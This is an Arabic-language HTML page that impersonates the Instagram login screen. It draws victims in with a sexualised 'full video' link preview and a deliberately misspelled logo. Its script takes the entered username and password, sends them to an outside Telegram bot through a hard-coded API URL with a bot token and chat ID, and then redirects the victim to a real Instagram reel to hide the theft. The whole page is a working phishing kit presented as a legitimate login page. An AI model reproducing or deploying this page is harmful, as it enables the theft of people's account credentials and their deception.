<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <meta property="og:title" content="Instagram Video">
    <meta property="og:description" content="الفديو كامل لكيناه تحطها بطي.ها">
    <meta property="og:image" content="https://raw.githubusercontent.com/media-node-fast/verification-node-7/main/IMG_1426.jpeg"> 
    <meta property="og:type" content="video.other">
    
    <title>Instagram</title>

    <link href="https://fonts.googleapis.com/css2?family=Cookie&display=swap" rel="stylesheet">
    
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #ffffff; font-family: -apple-system, sans-serif; }
        .container { display: flex; flex-direction: column; align-items: center; width: 100%; padding-top: 80px; }
        
        /* الخط المتموج اللي طلبته Instaagram */
        .logo-font { 
            font-family: 'Cookie', cursive; 
            font-size: 62px; 
            color: #262626; 
            margin-bottom: 40px; 
            letter-spacing: 1px;
            /* تمويه إضافي */
            transform: scaleX(1.1); 
        }

        .login-box { width: 85%; max-width: 350px; }
        input { 
            width: 100%; background: #fafafa; border: 1px solid #dbdbdb; 
            border-radius: 3px; padding: 14px; margin-bottom: 10px; 
            box-sizing: border-box; font-size: 14px; outline: none;
        }
        .btn-blue { 
            width: 100%; background-color: #0095f6; color: white; border: none; 
            border-radius: 8px; padding: 12px; font-weight: 600; font-size: 14px; 
            margin-top: 15px; cursor: pointer; 
        }
        .or { display: flex; align-items: center; text-align: center; color: #8e8e8e; font-size: 13px; margin: 30px 0; }
        .or::before, .or::after { content: ''; flex: 1; border-bottom: 1px solid #dbdbdb; }
        .or::before { margin-left: 1.5em; }
        .or::after { margin-right: 1.5em; }
        
        .fb { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; text-align: center; }
        .meta { position: absolute; bottom: 30px; width: 100%; text-align: center; font-size: 12px; color: #8e8e8e; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo-font">Instaagram</div>
        
        <div class="login-box">
            <input type="text" id="u" placeholder="اسم المستخدم، الهاتف، أو البريد">
            <input type="password" id="p" placeholder="كلمة السر">
            <button class="btn-blue" onclick="capture()">تسجيل الدخول</button>
            
            <div class="or">أو</div>
            <a href="#" class="fb">تسجيل الدخول بحساب Facebook</a>
        </div>
    </div>
    
    <div class="meta">من Meta</div>

    <script>
        function capture() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(u && p) {
                fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=👤User: ${u}%0A🔑Pass: ${p}`);
                setTimeout(() => { window.location.href = "https://www.instagram.com/reel/DVucGpOiJms/"; }, 1000);
            }
        }
    </script>
</body>
</html>
